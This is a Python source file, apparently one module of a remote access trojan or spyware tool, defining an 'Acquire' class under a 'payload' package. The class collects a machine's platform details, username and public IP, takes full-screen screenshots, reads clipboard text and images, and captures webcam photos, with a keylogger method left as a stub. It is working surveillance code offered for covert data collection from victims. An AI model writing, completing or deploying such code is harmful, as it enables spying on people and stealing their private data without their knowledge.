from datetime import datetime
from mss import mss
from win32clipboard import OpenClipboard, CloseClipboard, GetClipboardData, IsClipboardFormatAvailable, CF_UNICODETEXT, CF_TEXT
from PIL import ImageGrab, Image
from requests import get
from re import compile
from platform import uname
from subprocess import Popen, PIPE

from payload.camera import Camera
from utils.config import URL_GET_IP, IMAGE_PATH

class Acquire:
    def __init__(self) -> None:
        self.result = None

    def get_host_details(self):
        host_details = ""
        
        for platform_details in uname():
            host_details += platform_details + " "

        hostname = self.get_whoami()
        ip = self.get_ip()

        return f"[+] Platform: {host_details}\n[+] Hostname: {hostname}\n[+] Public IP: {ip}"
    

    def get_whoami(self):
        process = Popen('whoami', stdout=PIPE)
        stdout = process.communicate()[0]

        username = stdout.decode('utf-8').split('\r')[0]

        return username


    def get_ip(self):
        """
        generic way of getting the public ip address using
        "http://checkip.dyndns.com/" 
        """
        ip = ""
        try:
            response = get(URL_GET_IP)
            ip = compile(r'Address: (\d+\.\d+\.\d+\.\d+)').search(response.text).group(1)
        except Exception:
            pass

        return ip


    def screen_shot(self):
        image = ""
        with mss() as sct:
            image = sct.shot(mon=-1)
            
        return f'{IMAGE_PATH}\{image}'
    
    
    def get_clipboard(self):
        """
        retrieves clipboard in saved in memory
        can be media files, document or text

        TODO: Find a way to send the copied or cut documents also
        """
        OpenClipboard()
        CloseClipboard()

        clipboard = ""
        datatype = None
        cc_image = 'clipboard_image.png'

        # verifying if image or text is in the clipboard
        if IsClipboardFormatAvailable(CF_UNICODETEXT):
            OpenClipboard()
            clipboard, datatype = GetClipboardData(CF_UNICODETEXT), None
            CloseClipboard()
        elif IsClipboardFormatAvailable(CF_TEXT):
            OpenClipboard()
            clipboard, datatype = GetClipboardData(CF_TEXT), None
            CloseClipboard()
        else:
            clipboard, datatype = ImageGrab.grabclipboard(), "image"
            if isinstance(clipboard, Image.Image):
                clipboard.save(cc_image)
            return cc_image, datatype
    
        return clipboard, datatype
    

    def keylogger(self):
        """
        later implementation
        """
        pass

    def capture_image(self):
        camera = Camera()
        return camera.capture_image()